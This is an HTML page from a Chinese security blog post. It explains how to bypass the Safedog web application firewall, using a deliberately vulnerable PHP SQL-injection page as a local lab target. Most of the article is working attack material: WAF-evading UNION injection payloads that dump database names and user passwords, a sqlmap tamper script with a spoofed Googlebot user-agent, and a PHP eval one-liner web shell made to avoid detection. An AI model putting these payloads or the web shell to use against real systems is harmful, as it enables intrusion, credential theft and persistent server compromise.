@@ -1,0 +1,564 @@
+
+ <!DOCTYPE HTML>
+<html lang="cn-zh">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>bypass安全狗 | GetFlag&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="GetFlag">
+    
+
+    
+    <meta name="description" content="绕过安全狗v4.0默认配置防护，手工过狗，编写tamper脚本使sqlmap过狗，过狗一句话">
+<meta name="keywords" content="bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bypass安全狗">
+<meta property="og:url" content="http://flag0.com/2018/04/20/bypass安全狗/index.html">
+<meta property="og:site_name" content="GetFlag&#39;s Blog">
+<meta property="og:description" content="绕过安全狗v4.0默认配置防护，手工过狗，编写tamper脚本使sqlmap过狗，过狗一句话">
+<meta property="og:locale" content="cn-zh">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/3982D2E7B551471C8A27A130609F9357/8901">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/5FDC0E057B4B40469802E223239DBB02/8926">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/B65FA20A849B4D96AD3500D02B31FB04/8936">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/9AFC5EAE719840878E66F214162613E4/8939">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/C17477A6006147EDB1BE65058F64EE9B/8945">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/920381E167C64C7EB4F73C1E6AB87929/8948">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/64392F705D0A4D428C0739F67E1F26FD/8955">
+<meta property="og:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/0A9600ACA4D0494DB00A9C60D859AD2C/9042">
+<meta property="og:updated_time" content="2018-04-20T11:00:43.396Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="bypass安全狗">
+<meta name="twitter:description" content="绕过安全狗v4.0默认配置防护，手工过狗，编写tamper脚本使sqlmap过狗，过狗一句话">
+<meta name="twitter:image" content="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/3982D2E7B551471C8A27A130609F9357/8901">
+
+    
+    <link rel="alternative" href="/atom.xml" title="GetFlag&#39;s Blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="GetFlag&#39;s Blog">GetFlag&#39;s Blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:flag0.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/04/20/bypass安全狗/" title="bypass安全狗" itemprop="url">bypass安全狗</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
+		
+  <p class="article-time">
+    <time datetime="2018-04-20T10:00:03.000Z" itemprop="datePublished"> Published 2018-04-20</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#实验环境"><span class="toc-number">1.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#手工bypass"><span class="toc-number">2.</span> <span class="toc-text">手工bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安全狗检测以及绕过方式"><span class="toc-number">2.1.</span> <span class="toc-text">安全狗检测以及绕过方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#手工注入"><span class="toc-number">2.2.</span> <span class="toc-text">手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写tamper脚本"><span class="toc-number">3.</span> <span class="toc-text">编写tamper脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过狗一句话"><span class="toc-number">4.</span> <span class="toc-text">过狗一句话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#致谢"><span class="toc-number">5.</span> <span class="toc-text">致谢</span></a></li></ol>
+		
+		</div>
+		
+		<p>绕过安全狗v4.0默认配置防护，手工过狗，编写tamper脚本使sqlmap过狗，过狗一句话<br><a id="more"></a></p>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>靶机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows server 2003</span><br><span class="line">apache 2.4.23</span><br><span class="line">php 5.4.45</span><br><span class="line">mysql 5.0.10</span><br><span class="line">安全狗Apache版 V4.0.18089</span><br></pre></td></tr></table></figure></p>
+<p>web注入点:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$conn = mysql_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;);</span><br><span class="line">mysql_select_db(&quot;test&quot;,$conn);</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$sql=&quot;select id,username,password from yh where id=&apos;$id&apos;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;hr&gt;&lt;br&gt;&quot;;</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line">$obj=mysql_fetch_object($result);</span><br><span class="line">echo &quot;Id:$obj-&gt;id&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;Username:$obj-&gt;username&quot;;</span><br><span class="line">echo &quot;&lt;/br&gt;Password:$obj-&gt;password&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>ps:安装安全狗时设置服务名，可以讲phpstudy设置为系统服务，进<code>管理工具-&gt;服务</code>中查看</p>
+<h2 id="手工bypass"><a href="#手工bypass" class="headerlink" title="手工bypass"></a>手工bypass</h2><h3 id="安全狗检测以及绕过方式"><a href="#安全狗检测以及绕过方式" class="headerlink" title="安全狗检测以及绕过方式"></a>安全狗检测以及绕过方式</h3><p>经过测试发现安全狗会检测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and 1=2</span><br><span class="line">union</span><br><span class="line">from</span><br><span class="line">()</span><br></pre></td></tr></table></figure>
+<p>等这些函数</p>
+<p>可以通过以下下方式绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*!50001and*/ 1=2 或者 and -1=-2</span><br><span class="line">/*!50001union*/</span><br><span class="line">/*!50001from*/</span><br><span class="line">/*!50001()*/</span><br></pre></td></tr></table></figure>
+<p>其实的50001可以用其他的五位数字替换，但是有的五位数字不生效，具体生效范围未测试</p>
+<h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><p>判断注入点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/3982D2E7B551471C8A27A130609F9357/8901" alt="image"></p>
+<p>判断显示位</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1 and -1=-2 /*!11111union*/ select 1,2,3</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/5FDC0E057B4B40469802E223239DBB02/8926" alt="image"></p>
+<p>查当前数据库名和用户名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1 and -1=-2 /*!11111union*/ select user/*!11111()*/,2,3</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/B65FA20A849B4D96AD3500D02B31FB04/8936" alt="image"></p>
+<p>查看所有的数据库名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1 and -1=-2 /*!11111union*/ select group_concat(schema_name),2,3 /*!11111from*/ information_schema.schemata</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/9AFC5EAE719840878E66F214162613E4/8939" alt="image"></p>
+<p>查当前数据库下表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1 and -1=-2 /*!11111union*/ select group_concat(table_name),2,3 /*!11111from*/ information_schema.tables where  table_schema=0x74657374</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/C17477A6006147EDB1BE65058F64EE9B/8945" alt="image"></p>
+<p>查看列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1 and -1=-2 /*!11111union*/ select group_concat(column_name),2,3 /*!11111from*/ information_schema.columns where  table_name=0x7968</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/920381E167C64C7EB4F73C1E6AB87929/8948" alt="image"></p>
+<p>查看数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.86.129/sql/</span><br><span class="line">?id=1 and -1=-2 /*!11111union*/ select group_concat(username),group_concat(password),3 /*!11111from*/ yh</span><br></pre></td></tr></table></figure>
+<p><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/64392F705D0A4D428C0739F67E1F26FD/8955" alt="image"></p>
+<h2 id="编写tamper脚本"><a href="#编写tamper脚本" class="headerlink" title="编写tamper脚本"></a>编写tamper脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"> </span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"> </span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"> </span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    return payload.replace(&quot;UNION&quot;, &quot;/!*50001union*/&quot;).replace(&apos;FROM&apos;, &apos;/*!50001from*/&apos;).replace(&apos;()&apos;,&apos;/*!50001()*/&apos;).replace(&apos;AND&apos;,&apos;/*!50001and*/&apos;)</span><br></pre></td></tr></table></figure>
+<p>保存到sqlmap的tamper目录下</p>
+<p>使用时</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.86.129/sql/?id=1&quot; --tamper &quot;safedog.py&quot; --user-agent=&quot;Mozilla/5.0(compatible;Googlebot/2.1;+http://www.google.com/bot.html)&quot;</span><br></pre></td></tr></table></figure>
+<p>注意:sqlmap默认的user-agnet头为:<code>sqlmap/1.0.12.10#dev (http://sqlmap.org)</code><br>安全狗默认会拦截这个user-agent头<br><img src="https://note.youdao.com/yws/public/resource/84de699b5cf022384e54f2af4b94b6f1/xmlnote/0A9600ACA4D0494DB00A9C60D859AD2C/9042" alt="image"><br>使用<code>--user-agent</code>为user-agent指定ua头即可</p>
+<h2 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php function dog()&#123; return $_POST[1]; &#125; eval(dog()); ?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tamper编写</span><br><span class="line">https://www.cnblogs.com/test404/p/7071868.html</span><br><span class="line">必火表哥</span><br><span class="line">http://www.xss.tv/</span><br><span class="line">http://www.nvhack.com/</span><br></pre></td></tr></table></figure>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/安全竞赛/">安全竞赛</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/bypass/">bypass</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://flag0.com/2018/04/20/bypass安全狗/" data-title="bypass安全狗 | GetFlag&#39;s Blog" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/04/17/《汇编语言》-第三版-实验7/"  title="《汇编语言》(第三版)实验7 寻址方式在结构化数据访问中的应用">
+ <strong>下一篇：</strong><br/> 
+ <span>《汇编语言》(第三版)实验7 寻址方式在结构化数据访问中的应用
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#实验环境"><span class="toc-number">1.</span> <span class="toc-text">实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#手工bypass"><span class="toc-number">2.</span> <span class="toc-text">手工bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安全狗检测以及绕过方式"><span class="toc-number">2.1.</span> <span class="toc-text">安全狗检测以及绕过方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#手工注入"><span class="toc-number">2.2.</span> <span class="toc-text">手工注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写tamper脚本"><span class="toc-number">3.</span> <span class="toc-text">编写tamper脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过狗一句话"><span class="toc-number">4.</span> <span class="toc-text">过狗一句话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#致谢"><span class="toc-number">5.</span> <span class="toc-text">致谢</span></a></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/安全竞赛/" title="安全竞赛">安全竞赛<sup>6</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/编程开发/" title="编程开发">编程开发<sup>7</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/python/" title="python">python<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/汇编/" title="汇编">汇编<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/学习笔记/" title="学习笔记">学习笔记<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/自动化/" title="自动化">自动化<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/综合渗透/" title="综合渗透">综合渗透<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/铁人三项/" title="铁人三项">铁人三项<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Writeup/" title="Writeup">Writeup<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/攻击脚本/" title="攻击脚本">攻击脚本<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/docker/" title="docker">docker<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/笔记/" title="笔记">笔记<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/XAMPP/" title="XAMPP">XAMPP<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/pdo/" title="pdo">pdo<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/error/" title="error">error<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/selenium/" title="selenium">selenium<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Wireshark/" title="Wireshark">Wireshark<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/培训总结/" title="培训总结">培训总结<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/信息安全管理与评估/" title="信息安全管理与评估">信息安全管理与评估<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/bypass/" title="bypass">bypass<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://www.cnblogs.com/test404" target="_blank" title="胖虎">胖虎</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://p0desta.top" target="_blank" title="p0desta">p0desta</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> Rise and rise again until lambs become lions <br/>
+			Everyone can cook, but only those who dare to try can become the real chef.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		<a href="https://github.com/https://github.com/flag0" target="_blank" class="icon-github" title="github"></a>
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		<a href="mailto:root@flag0.com" target="_blank" class="icon-email" title="Email Me"></a>
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2018 
+		
+		<a href="/about" target="_blank" title="GetFlag">GetFlag</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
